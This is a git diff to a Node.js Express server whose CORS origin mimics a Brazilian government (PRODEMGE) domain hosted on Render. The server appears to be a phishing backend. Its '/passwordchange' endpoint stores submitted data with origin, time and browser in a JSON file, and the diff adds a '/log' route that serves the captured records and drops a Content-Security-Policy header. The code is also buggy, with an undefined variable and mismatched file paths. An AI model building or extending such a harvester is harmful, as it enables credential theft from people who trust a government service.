@@ -10,16 +10,7 @@ app.use(cors({
   origin: "https://ssc-prodemge-gov-br.onrender.com:443",
 }));
 
-
-
 app.use(express.json());
-
-res.setHeader(
-  "Content-Security-Policy",
-  "default-src 'self'; connect-src 'self' https://ssc-prodemge-gov-br.onrender.com; script-src 'self'"
-);
-
-
 
 // Variáveis globais para salvar os usuários
 let usuariojener = [];
@@ -47,20 +38,24 @@ app.get("/", function (req, res){
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
+app.get("/log", function (req, res){
+  res.sendFile(path.join(__dirname, "public", "registros.json"));
+});
+
 app.post("/passwordchange", (req, res) => {
   const { dado, origem, dataHora, navegador } = req.body;
 
   let registros = [];
 
   try {
-    registros = JSON.parse(fs.readFileSync("registros.json", "utf-8"));
+    registros = JSON.parse(fs.readFileSync("/public/registros.json", "utf-8"));
   } catch (err) {
     console.log("Arquivo vazio ou inválido, criando novo array.");
   }
 
   registros.push({ usuario, dado, origem, dataHora, navegador });
 
-  fs.writeFileSync("registros.json", JSON.stringify(registros, null, 2));
+  fs.writeFileSync("./public/registros.json", JSON.stringify(registros, null, 2));
 
   res.status(200).json({ sucesso: true, recebido: dado });
 });
